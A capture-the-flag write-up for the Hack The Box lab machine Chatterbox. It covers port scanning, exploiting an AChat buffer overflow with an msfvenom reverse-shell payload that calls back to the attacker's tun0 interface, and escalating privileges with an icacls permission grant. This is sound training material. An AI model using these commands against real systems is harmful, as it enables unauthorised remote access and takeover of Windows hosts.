---
title: "HTB Chatterbox"
permalink: /writeups/chatterbox
location: default
---

# HTB Chatterbox

**Machine Information**

	IP : 10.10.10.74
	OS : Windows

### Reconnaissance

**Rustscan**

Start by running a port scan using `rustscan`.

```
rustscan -a 10.10.10.74 -- -sC -sV
```

This should reveal five open ports: `80`, `135`, and `445`, `9255`, and `9256`.

```
PORT      STATE SERVICE      REASON  VERSION
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
9255/tcp  open  tcpwrapped   syn-ack
9256/tcp  open  tcpwrapped   syn-ack
49152/tcp open  msrpc        syn-ack Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack Microsoft Windows RPC
49155/tcp open  msrpc        syn-ack Microsoft Windows RPC
49156/tcp open  msrpc        syn-ack Microsoft Windows RPC
49157/tcp open  msrpc        syn-ack Microsoft Windows RPC
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h20m01s, deviation: 2h18m36s, median: 4h59m59s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-05-11T07:33:23-04:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 38735/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 3922/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 64306/udp): CLEAN (Failed to receive data)
|   Check 4 (port 14492/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2024-05-11T11:33:21
|_  start_date: 2024-05-11T11:29:41
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

The first scan didn't reveal much for port `9255` and `9256` so I ran another one.

```
nmap -p 9255,9256 10.10.10.74 -sC -sV
```

The second scan shows information about a system called `AChat`.

```
PORT     STATE SERVICE VERSION
9255/tcp open  http    AChat chat system httpd
|_http-server-header: AChat
|_http-title: Site doesn't have a title.
9256/tcp open  achat   AChat chat system
```

### Getting a Foothold

Checking `searchsploit` for the product `Achat` returns a remote buffer overflow vulnerability. 

```
Achat 0.150 beta7 - Remote Buffer Overflow | windows/remote/36025.py
```

Copy this to our current working directory.

```
searchploit -m windows/remote/36025.py
```

Reviewing the source code shows it is designed to launch `calc.exe` so we can modify the payload to create a reverse shell. The source code tells us which bad characters to exclude so we can include this in the following `msfvenom` command:

```
msfvenom EXITFUNC=thread -p windows/shell_reverse_tcp LHOST=tun0 LPORT=9001 BufferRegister=EAX -e x86/unicode_mixed --arch x86 --platform windows -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' -f python
```

Add this payload to the python script and update the target IP. Once everything is ready start a `netcat` listener and launch the payload to get a reverse shell.

```
python2 36025.py
```

Success!

```
C:\Windows\system32>whoami
chatterbox\alfred
```

The user flag can be retrieved from the following directory:

```
C:\Users\alfred\Desktop\user.txt
```

### Privilege Escalation

As the user Alfred we can go into the Administrator folder but can't read the root flag. However, running the command `icacls` shows that Alfred has full permissions for the file.

```
icacls root.txt
```

```
root.txt CHATTERBOX\Administrator:(F)
```

Running the following command allows Alfred to update his permissions to read the file.

```
icacls root.txt /grant Alfred:F
```

The root flag can now be read from the following directory:

```
C:\Users\Administrator\Desktop\root.txt
```
